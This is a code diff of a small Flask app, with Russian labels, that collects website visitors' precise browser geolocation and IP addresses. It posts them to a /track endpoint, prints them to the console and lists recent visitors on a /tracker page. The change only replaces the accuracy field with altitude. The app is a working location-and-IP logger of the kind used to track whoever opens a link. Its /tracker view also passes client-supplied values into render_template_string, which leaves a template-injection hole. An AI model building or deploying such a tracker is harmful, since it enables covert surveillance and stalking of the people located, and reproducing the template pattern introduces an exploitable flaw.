@@ -16,11 +16,11 @@ body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify
 navigator.geolocation.getCurrentPosition(p=>{
 let lat = p.coords.latitude.toFixed(6);
 let lon = p.coords.longitude.toFixed(6);
-let acc = p.coords.accuracy.toFixed(1);
-document.getElementById('c').innerText = lat + ' ' + lon + ' ' + acc;
+let alt = p.coords.altitude ? p.coords.altitude.toFixed(1) : '0';
+document.getElementById('c').innerText = lat + ' ' + lon + ' ' + alt;
 fetch('/track', {
     method:'POST',
-    body:JSON.stringify({lat:lat, lon:lon, acc:acc}),
+    body:JSON.stringify({lat:lat, lon:lon, alt:alt}),
     headers:{'Content-Type':'application/json'}
 });
 }, e=>{}, {enableHighAccuracy:true, timeout:10000});
@@ -41,7 +41,7 @@ def main():
 def tracker():
     output = f'=== ВСЕГО: {len(visitors)} ===\n\n'
     for i, v in enumerate(visitors[-100:], 1):
-        output += f'{i}. {v["lat"]} {v["lon"]} {v["acc"]} | {v["ip"]}\n'
+        output += f'{i}. {v["lat"]} {v["lon"]} {v["alt"]} | {v["ip"]}\n'
     return render_template_string(TRACKER_HTML.replace('{}', output))
 
 @app.route('/track', methods=['POST'])
@@ -50,13 +50,15 @@ def track():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ',' in ip:
         ip = ip.split(',')[0].strip()
-    if d and 'lat' in d and 'lon' in d and 'acc' in d:
-        entry = {'lat': d['lat'], 'lon': d['lon'], 'acc': d['acc'], 'ip': ip}
+    if d and 'lat' in d and 'lon' in d and 'alt' in d:
+        entry = {'lat': d['lat'], 'lon': d['lon'], 'alt': d['alt'], 'ip': ip}
         visitors.append(entry)
         print(f'\n=== НОВЫЙ ===')
-        print(f'GEO: {d["lat"]} {d["lon"]} {d["acc"]}')
+        print(f'ШИРОТА: {d["lat"]}')
+        print(f'ДОЛГОТА: {d["lon"]}')
+        print(f'ВЫСОТА: {d["alt"]} м')
         print(f'IP: {ip}')
-        print(f'Время: {datetime.now().strftime("%H:%M:%S")}')
+        print(f'ВРЕМЯ: {datetime.now().strftime("%H:%M:%S")}')
         print('============\n')
     return '', 204
 
